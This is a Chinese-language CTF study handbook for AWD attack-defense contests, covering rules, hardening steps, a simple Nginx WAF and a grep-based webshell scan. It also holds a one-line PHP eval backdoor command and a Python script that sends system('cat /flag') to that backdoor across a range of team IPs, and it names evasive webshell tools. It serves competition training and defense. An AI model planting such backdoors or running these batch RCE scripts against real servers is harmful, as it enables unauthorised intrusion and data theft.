# AWD 攻防赛作战手册

> **📘 文档定位**：CISP 考试 CTF 安全 高级 | 难度：⭐⭐⭐⭐ | 预计阅读：25 分钟
>
> AWD 攻防赛快速参考手册，覆盖赛制规则/常见漏洞/批量攻击脚本/防御加固清单及团队协作策略。

---

## 导航目录

- [一、AWD 规则速览](#一awd-规则速览)
- [二、常见漏洞速查](#二常见漏洞速查)
- [三、批量攻击脚本](#三批量攻击脚本)
- [四、防御加固清单](#四防御加固清单)
- [五、安全部署 Checklist](#五安全部署-checklist)
- [六、高分考点与知识巧记](#六高分考点与知识巧记)

---

## 1. AWD 规则速览

- 每个队伍拿到相同的靶机（多台 Web / Pwn 题）
- **Attack**：攻击其他队伍靶机，拿到 flag 提交得分
- **Defense**：加固自己靶机，防止被打（被打失分）
- 一般有 CheckSystem：每几分钟会校验服务可用性，攻击/防御不能导致服务不可用
- 每轮 flag 会刷新

## 2. 防御（Defense）流程

### 2.1 上线即做

1. 备份原始源码 / 二进制：`tar -zcf /tmp/backup.tar.gz /var/www/html /home/ctf`
2. 查看源码审计入口
3. 快速建立 WAF 规则（Nginx / Apache 级别）
4. 关无关端口，禁止 root SSH 登录（如规则允许）
5. 部署简单 shell / 内存马查杀脚本

### 2.2 常见 Web 修复思路

- 字符过滤：`preg_replace('/[#\'\"\\\\]/', '', $input)` 或更严格白名单
- 后台接口加 token / 简单密码
- `eval` / `system` / `assert` 等危险函数禁用（`disable_functions`）
- `open_basedir` 限制目录
- 上传点限制后缀、内容、MIME
- SQL 注入：使用 PDO 预编译 / 白名单字段
- 反序列化：`unserialize` 调用前做白名单类判断

### 2.3 通用防御脚本（Bash 示例）

```bash
# 每 5 秒备份网站源码（防止被挂马后无从恢复）
while :; do
    cp -r /var/www/html /tmp/html_$(date +%s)
    sleep 5
done

# 简单 shell 查杀（仅供理解；比赛时慎用）
grep -rE 'eval|assert|system|exec|shell_exec' /var/www/html | head -20
```

### 2.4 Nginx 简易 WAF

```nginx
location / {
    if ($query_string ~* "(union.*select|information_schema|sleep\()") { return 403; }
    if ($request_body ~* "(<script|onerror=|javascript:)") { return 403; }
    try_files $uri $uri/ /index.php?$args;
}
```

## 3. 攻击（Attack）流程

1. 扫描其他队伍开放端口 / 服务
2. 通过源码审计发现漏洞，写 exploit（Python）
3. 批量打各队伍 IP，获取 flag
4. 用 flag 批量提交脚本提交到裁判系统

### 3.1 常见攻击向量

- **Web**：SQL 注入、RCE（`eval($_POST[1])`）、文件上传、反序列化、LFI → getshell
- **Pwn**：栈溢出 / 格式化字符串 / UAF，直接弹 shell 或读 flag 文件
- **后门**：`echo "<?php @eval(\$_POST[1]);" > /var/www/html/x.php`
- **SSH 弱口令**：如果题目环境有弱口令

### 3.2 攻击脚本模板（Python）

```python
import requests
import re
ips = [f"10.1.{i}.100" for i in range(1, 30)]  # 各队 IP 段
for ip in ips:
    try:
        # payload：执行 cat /flag
        r = requests.post(f"http://{ip}/x.php", data={"1": "system('cat /flag');"}, timeout=3)
        m = re.search(r"flag\{[^}]+\}", r.text)
        if m: print(ip, m.group(0))
    except Exception as e:
        pass
```

### 3.3 批量提交

```python
import requests
submit_api = "http://10.0.0.1/api/submit"
flags = ["flag{...}", "flag{...}"]
for f in flags:
    r = requests.post(submit_api, json={"flag": f})
    print(f, r.text[:80])
```

## 4. 应急处置 / 反制

1. 监测 `/flag` / 关键目录读取
2. `tail -f /var/log/nginx/access.log` 看攻击向量
3. 被攻后：修复漏洞 + 恢复源码（第一步的备份派上用场）
4. 攻击者 shell 查杀：用 `ls -latr /tmp`、`ps auxf`、`netstat -antp` 找异常
5. 反弹 shell 阻断：iptables 禁止出站；或仅允许特定 IP 段

## 5. 必备小工具（比赛前放在本地）

- Python 3 + requests / pwntools
- Ncat / socat
- 常用 Web shell（冰蝎 / 哥斯拉 免杀马，仅用于合法比赛）
- 一句话后门批量扫描脚本
- 源码对比工具（meld / diff）

## 6. 比赛时间节奏建议

- **0-10min**：备份、看源码、快速抓 flag（最容易的漏洞）
- **10-30min**：加固己方（打 WAF、修明显漏洞）
- **30min+**：持续审计新漏洞 / 写批量攻击脚本 / 监控攻击日志

---

> AWD 是团队战，分工很重要：1 人 Web、1 人 Pwn、1 人运维/批量。提前准备脚本和工具链能显著提升效率。
